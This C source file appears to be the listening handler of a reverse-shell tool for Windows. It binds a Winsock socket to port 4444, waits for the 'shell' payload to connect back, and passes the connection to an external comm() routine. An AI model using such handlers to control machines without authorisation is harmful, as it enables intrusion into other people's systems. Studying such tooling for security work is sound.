#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "clientComm.h"

#ifndef CLIENT_COMM_HEADER
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#endif

// Two macros for stringizing s
// More info at https://gcc.gnu.org/onlinedocs/cpp/Argument-Prescan.html#Argument-Prescan
#define xstr(s) str(s)
#define str(s) #s

#define BUF_SIZE 4096
#define INPUT_SIZE 512

int startListening();

int port; // the port the payload in listening on
char ip[24];

int main(){
    port = 4444;  // default value
    strcpy(ip, "192.168.1.1");  // default value

    // for use with the -D switch when compiling with gcc
    #ifdef PORT
        port = PORT;
    #endif
    #ifdef IP
        strcpy(ip, xstr(IP));
    #endif

    startListening();

    return 0;
}

/*
Function that starts listening for the connection from the corresponding shell
Return values:
    0 - exited normally
    1 - exited with error
*/
int startListening(){
    printf("Starting client with the following settings:\nPort: %d\nIP: %s\n", port, ip);  // actually currently accepts connection from any ip but that could be changed

    // initialize winsock
    WSADATA wsData;
    WORD version = MAKEWORD(2,2);
    int wsock = WSAStartup(version, &wsData);
    if ( wsock != 0) {
        printf("Can't initialize winsock. Quitting...\n");
        return 1;
    }

    // create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET){
        printf("Invalid socket. Quitting...\n");
        return 1;
    }

    // bind socket to ip address and port
    struct sockaddr_in hint; // a hint structure (?)
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; //same thing as the inet_pton line - tells to use any address (could set to use only the ip address given...)
    bind(sock, (struct sockaddr*)&hint, sizeof(hint));

    // tell winsock the socket for meant to listen for incoming connections
    listen(sock, SOMAXCONN);
    printf("Listening for incoming connection from shell...\n");

    // wait for a connection
    struct sockaddr_in shell;
    int clientSize = sizeof(shell);
    SOCKET shellSocket = accept(sock, (struct sockaddr*)&shell, &clientSize);

    // the connected host's ip
    char client_ip[NI_MAXHOST];
    memset(client_ip, 0, sizeof(client_ip));

    inet_ntop(AF_INET, &shell.sin_addr, client_ip, NI_MAXHOST);
    printf("%s connected on port %d\n", client_ip, port);

    // close listening port once a connection has been recieved
    // don't need the listening socket because now we have the connected socket
    closesocket(sock);

    while ( comm(shellSocket, BUF_SIZE, INPUT_SIZE) );
    closesocket(shellSocket);
    WSACleanup();
    printf("Connection ended. Good bye!");
    return 0;

}